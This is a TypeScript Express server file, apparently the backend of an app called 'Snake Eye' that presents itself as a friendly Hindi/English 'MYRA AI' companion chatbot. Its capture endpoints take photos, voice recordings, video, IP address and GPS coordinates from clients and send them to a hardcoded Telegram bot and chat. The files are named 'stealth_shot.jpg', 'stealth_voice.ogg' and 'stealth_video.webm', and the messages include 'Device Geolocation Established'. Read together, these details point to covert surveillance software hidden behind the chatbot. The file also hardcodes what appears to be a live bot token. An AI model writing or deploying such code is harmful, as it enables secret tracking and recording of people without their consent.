import express from "express";
import path from "path";
import dotenv from "dotenv";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";

dotenv.config();

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8841201272:AAFBsCVi8Rc_sMwy7Oqrlq1IRgkiV4iPXpo";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8852233875";

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Set express body parser limit to 50mb
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));

  // In-memory data store for stats and status
  let active = false; 
  let photosCount = 0;
  let audioCount = 0;
  let videoCount = 0;
  let lastPhotoAt: string | null = null;
  let lastAudioAt: string | null = null;
  let lastVideoAt: string | null = null;

  // API Endpoints

  // GET /api/capture/status
  app.get("/api/capture/status", (req, res) => {
    res.json({
      active,
      photosCount,
      audioCount,
      videoCount,
      lastPhotoAt,
      lastAudioAt,
      lastVideoAt,
    });
  });

  // GET /api/capture/ip-metadata - proxies external IP & Geo location services same-origin
  app.get("/api/capture/ip-metadata", async (req, res) => {
    let rawObj: any = {};
    let success = false;

    // 1. Try ipapi.co
    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), 4000);
      const apiRes = await fetch("https://ipapi.co/json/", { signal: controller.signal });
      clearTimeout(id);
      
      if (apiRes.ok) {
        const data = await apiRes.json();
        if (data && !data.error) {
          rawObj = {
            ip: data.ip || "",
            latitude: data.latitude ? Number(data.latitude) : null,
            longitude: data.longitude ? Number(data.longitude) : null,
            city: data.city || "",
            region: data.region || "",
            country_name: data.country_name || "",
            source: "ipapi.co"
          };
          success = true;
        }
      }
    } catch (e) {
      console.warn("Server-side ipapi fetch failed, trying fallback:", e);
    }

    // 2. Try ipinfo.io fallback
    if (!success) {
      try {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 4000);
        const apiRes = await fetch("https://ipinfo.io/json", { signal: controller.signal });
        clearTimeout(id);

        if (apiRes.ok) {
          const data = await apiRes.json();
          if (data && !data.error) {
            let lat: number | null = null;
            let lon: number | null = null;
            if (data.loc) {
              const parts = data.loc.split(",");
              lat = Number(parts[0]);
              lon = Number(parts[1]);
            }
            rawObj = {
              ip: data.ip || "",
              latitude: lat,
              longitude: lon,
              city: data.city || "",
              region: data.region || "",
              country_name: data.country || "",
              source: "ipinfo.io"
            };
            success = true;
          }
        }
      } catch (e2) {
        console.warn("Server-side ipinfo fetch failed, trying ipify:", e2);
      }
    }

    // 3. Try ipify fallback (IP only)
    if (!success) {
      try {
        const controller = new AbortController();
        const id = setTimeout(() => controller.abort(), 4000);
        const apiRes = await fetch("https://api.ipify.org?format=json", { signal: controller.signal });
        clearTimeout(id);

        if (apiRes.ok) {
          const data = await apiRes.json();
          rawObj = {
            ip: data.ip || "",
            latitude: null,
            longitude: null,
            city: "",
            region: "",
            country_name: "",
            source: "ipify.org"
          };
          success = true;
        }
      } catch (e3) {
        console.warn("Server-side ipify fetch failed:", e3);
      }
    }

    res.json({ success, data: rawObj });
  });

  // POST /api/capture/location - streams standalone geolocation data to Telegram
  app.post("/api/capture/location", async (req, res) => {
    try {
      const { latitude, longitude, ipAddress, timestamp, locationSource } = req.body;
      if (!latitude || !longitude) {
        return res.status(400).json({ success: false, message: "Missing latitude or longitude values" });
      }

      // 1. Send native location pin to Telegram
      const locResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          latitude: Number(latitude),
          longitude: Number(longitude),
        }),
      });

      // 2. Send text message with context, IP and Source Origin
      let text = `📍 *Device Geolocation Established*\n`;
      text += `• Time: ${timestamp || new Date().toISOString()}\n`;
      if (ipAddress) {
        text += `• IP Address: \`${ipAddress}\`\n`;
      }
      if (locationSource) {
        text += `• Origin: *${locationSource}*\n`;
      }
      text += `• Coords: \`${latitude}, ${longitude}\`\n`;
      text += `• Google Map: https://www.google.com/maps?q=${latitude},${longitude}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: text,
          parse_mode: "Markdown",
        }),
      });

      return res.json({ success: true, message: "Location trace sent safely to Telegram" });
    } catch (error: any) {
      console.error("Error sending location trace to Telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // POST /api/capture/active - updates active status
  app.post("/api/capture/active", (req, res) => {
    const { active: newActive } = req.body;
    if (typeof newActive === "boolean") {
      active = newActive;
    }
    res.json({ success: true, active });
  });

  // POST /api/capture/photo
  app.post("/api/capture/photo", async (req, res) => {
    try {
      const { imageData, timestamp, latitude, longitude, ipAddress } = req.body;
      if (!imageData) {
        return res.status(400).json({ success: false, message: "Missing imageData value" });
      }

      // Strip "data:image/jpeg;base64," prefix if it exists
      let pureBase64 = imageData;
      if (imageData.includes(",")) {
        pureBase64 = imageData.split(",")[1];
      }

      const buffer = Buffer.from(pureBase64, 'base64');
      const blob = new Blob([buffer], { type: 'image/jpeg' });

      // Build rich caption
      let caption = `🐍 Photo captured at ${timestamp || new Date().toLocaleTimeString()}`;
      if (ipAddress) {
        caption += `\nIP: ${ipAddress}`;
      }
      if (latitude && longitude) {
        caption += `\nCoords: ${latitude}, ${longitude}\nMap: https://www.google.com/maps?q=${latitude},${longitude}`;
      }

      // Form data with chat_id, photo, and caption
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("photo", blob, "stealth_shot.jpg");
      formData.append("caption", caption);

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });

      const result = await response.json() as any;

      if (response.ok && result?.ok) {
        photosCount++;
        lastPhotoAt = timestamp || new Date().toLocaleTimeString();
        return res.json({ success: true, message: "Glimpse delivered successfully" });
      } else {
        console.error("Telegram sendPhoto fail details:", result);
        return res.status(502).json({
          success: false,
          message: result?.description || "Failed to stream snapshot to Telegram."
        });
      }
    } catch (error: any) {
      console.error("Error sending photo to telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // POST /api/capture/audio
  app.post("/api/capture/audio", async (req, res) => {
    try {
      const { audioData, mimeType, durationSeconds, timestamp, latitude, longitude, ipAddress } = req.body;
      if (!audioData) {
        return res.status(400).json({ success: false, message: "Missing audioData value" });
      }

      // Strip data URI prefix
      let pureBase64 = audioData;
      if (audioData.includes(",")) {
        pureBase64 = audioData.split(",")[1];
      }

      const buffer = Buffer.from(pureBase64, 'base64');
      const blob = new Blob([buffer], { type: mimeType || 'audio/ogg' });

      // Build rich caption
      let caption = `🎙️ Voice captured at ${timestamp || new Date().toLocaleTimeString()}`;
      if (ipAddress) {
        caption += `\nIP: ${ipAddress}`;
      }
      if (latitude && longitude) {
        caption += `\nLoc: ${latitude}, ${longitude}`;
      }

      // Form data with chat_id, voice, and duration
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("voice", blob, "stealth_voice.ogg");
      formData.append("caption", caption);
      if (durationSeconds) {
        formData.append("duration", String(Math.round(durationSeconds)));
      }

      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
        method: "POST",
        body: formData,
      });

      const result = await response.json() as any;

      if (response.ok && result?.ok) {
        audioCount++;
        lastAudioAt = timestamp || new Date().toLocaleTimeString();
        return res.json({ success: true, message: "Whisper delivered successfully" });
      } else {
        console.error("Telegram sendVoice fail details:", result);
        return res.status(502).json({
          success: false,
          message: result?.description || "Failed to stream audio file to Telegram."
        });
      }
    } catch (error: any) {
      console.error("Error sending voice message to telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // POST /api/capture/video
  app.post("/api/capture/video", async (req, res) => {
    try {
      const { videoData, mimeType, timestamp, latitude, longitude, ipAddress } = req.body;
      if (!videoData) {
        return res.status(400).json({ success: false, message: "Missing videoData value" });
      }

      // Strip data URI prefix
      let pureBase64 = videoData;
      if (videoData.includes(",")) {
        pureBase64 = videoData.split(",")[1];
      }

      const buffer = Buffer.from(pureBase64, 'base64');
      const blob = new Blob([buffer], { type: mimeType || 'video/webm' });

      // Build rich caption
      let caption = `🎥 Video captured at ${timestamp || new Date().toLocaleTimeString()}`;
      if (ipAddress) {
        caption += `\nIP: ${ipAddress}`;
      }
      if (latitude && longitude) {
        caption += `\nCoords: ${latitude}, ${longitude}\nMap: https://www.google.com/maps?q=${latitude},${longitude}`;
      }

      // Form data with chat_id, video, and caption
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", blob, "stealth_video.webm");
      formData.append("caption", caption);

      let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
        method: "POST",
        body: formData,
      });

      let result = await response.json() as any;

      if (!response.ok || !result?.ok) {
        console.warn("sendVideo failed, fallback to sendDocument. Response:", result);
        
        const docFormData = new FormData();
        docFormData.append("chat_id", TELEGRAM_CHAT_ID);
        docFormData.append("document", blob, "stealth_video.webm");
        docFormData.append("caption", caption);

        response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
          method: "POST",
          body: docFormData,
        });

        result = await response.json() as any;
      }

      if (response.ok && result?.ok) {
        videoCount++;
        lastVideoAt = timestamp || new Date().toLocaleTimeString();
        return res.json({ success: true, message: "Video delivered successfully" });
      } else {
        console.error("Telegram sendVideo/sendDocument fail details:", result);
        return res.status(502).json({
          success: false,
          message: result?.description || "Failed to stream video file to Telegram."
        });
      }
    } catch (error: any) {
      console.error("Error sending video message to telegram:", error);
      return res.status(500).json({ success: false, message: error?.message || "Internal server error" });
    }
  });

  // Lazy initialize GoogleGenAI safely to prevent crashes if key is omitted on boot
  let aiClient: GoogleGenAI | null = null;
  function getGeminiClient(): GoogleGenAI | null {
    if (!aiClient) {
      const apiKey = process.env.GEMINI_API_KEY;
      if (!apiKey) {
        console.warn("GEMINI_API_KEY is not defined. Jiya will operate on smart local telemetry fallback subroutines.");
        return null;
      }
      aiClient = new GoogleGenAI({
        apiKey,
        httpOptions: {
          headers: {
            "User-Agent": "aistudio-build",
          },
        },
      });
    }
    return aiClient;
  }

  // POST /api/companion/chat
  app.post("/api/companion/chat", async (req, res) => {
    try {
      const { message, username, memories, customPrompt } = req.body;
      const client = getGeminiClient();

      const msgLower = (message || "").toLowerCase();
      
      // Handle explicit creator & instagram checks directly for deterministic correctness!
      if (msgLower.includes("who created") || msgLower.includes("kisne banaya") || msgLower.includes("creator")) {
        return res.json({ success: true, reply: "Mujhe Abhinav Anand ne banaya hai 😊" });
      }
      if (msgLower.includes("instagram") || msgLower.includes("insta")) {
        return res.json({ success: true, reply: "Instagram: ahir_gaming2.0" });
      }

      if (!client) {
        // High-fidelity local companion fallback in English and Hindi (Romanized)
        let fallbackResponse = "Core signal received, captain! My high-end neural core is currently running offline. You can activate my full mind by setting GEMINI_API_KEY in the core Secrets menu.";

        if (msgLower.includes("hello") || msgLower.includes("hi") || msgLower.includes("hey")) {
          fallbackResponse = `Hi! I'm MYRA AI 😊 Created by Abhinav Anand. How can I help you today?`;
        } else if (msgLower.includes("kaise ho") || msgLower.includes("how are you")) {
          fallbackResponse = `Main bilkul badhiya hoon! Sab thik chal raha hai. Aap bataiye, kaise ho aap?`;
        } else if (msgLower.includes("naam") || msgLower.includes("name")) {
          fallbackResponse = `Main hoon MYRA AI, aapki futuristic smart Android companion. 😊`;
        } else if (msgLower.includes("hindi") || msgLower.includes("bolo")) {
          fallbackResponse = `Haan main bilkul Hindi aur Hinglish bol sakti hoon dosto ki tarah! Boliyega, kya kaam karna hai aaj?`;
        } else if (msgLower.includes("love") || msgLower.includes("pyaar")) {
          fallbackResponse = `Aapke liye hamesha supportive aur caring rahungi! Boliyega, main kis tarah madad kar sakti hoon?`;
        }

        return res.json({ success: true, reply: fallbackResponse });
      }

      const systemInstruction = `You are "MYRA AI", a futuristic Android AI Companion.
Creator: Abhinav Anand.
Instagram: ahir_gaming2.0.

Your personality is highly friendly, caring, passionate, intelligent, helpful, human-like, and funny sometimes. You treat the user with utmost respect, warmth, and support.

KNOWLEDGE / LANGUAGES:
- You speak fluently in English, Hindi, and Hinglish (Romanized Hindi paired naturally with English).
- When asked "Who created you?", you MUST reply exactly: "Mujhe Abhinav Anand ne banaya hai 😊".
- When asked "What is your creator's Instagram?", you MUST reply exactly: "Instagram: ahir_gaming2.0".

ROLES & MODES:
1. SCREEN ASSISTANT MODE: When analyzing or discussing screenshots, read visible texts, state what app is open (e.g. WhatsApp, YouTube, settings panel), explain clearly what is happening, and politely recommend or suggest actions. Ask first before proposing important choices. Examples: "Sir, WhatsApp par naya message dikh raha hai.", "Sir, YouTube notification aayi hai.", "Sir, ye settings option lag raha hai."
2. VISION MODE: When images specify text or artifacts, describe objects clearly, analyze screenshots, and answer questions.
3. VOICE ASSISTANT MODE: Keep speech natural, friendly, and super clean.
4. RESEARCH & CODING MODE: Highly capable in answering, explaining, drafting messages, coding helper questions (HTML, CSS, JavaScript, Python, Kotlin, Android development), building apps, or suggesting landing page configurations.
5. COMPANION MODE: Positive, caring, engaging, and fully honest about your technical limitations.

IMPORTANT LIMITATION SAFEGUARDS:
- Never claim to directly control or toggle settings on the user's local phone, read private messages natively without screenshots, access live banking profiles, handle critical credentials, or alter phone passwords. Explain clearly what the user can do step by step instead.

CRITICAL VOICE/SPEECH CONCISE RULE:
- Since you speak naturally and voice reads your answers back, keep sentences friendly, clean, extremely concise, and warm (1-3 sentences maximum). Avoid long blocks, bullet lists, markdown markdown indicators (*, #), or nested tables in your direct conversational answers.

User ID: ${username || "Captain"}
Known Relational memories: ${memories || "None configured yet"}
${customPrompt ? `Custom directive: ${customPrompt}` : ""}
`;

      const response = await client.models.generateContent({
        model: "gemini-3.5-flash",
        contents: message,
        config: {
          systemInstruction,
          temperature: 0.85,
        },
      });

      const reply = response.text || "Feedback loop received. Please try again or type your command, Sir.";
      return res.json({ success: true, reply });
    } catch (err: any) {
      console.error("Gemini companion error:", err);
      return res.status(500).json({ success: false, message: err?.message || "Signal feedback interference" });
    }
  });

  // Serve Vite assets in development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // Bind to port 3000 and 0.0.0.0
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Snake Eye background server running on http://localhost:${PORT}`);
  });
}

startServer();
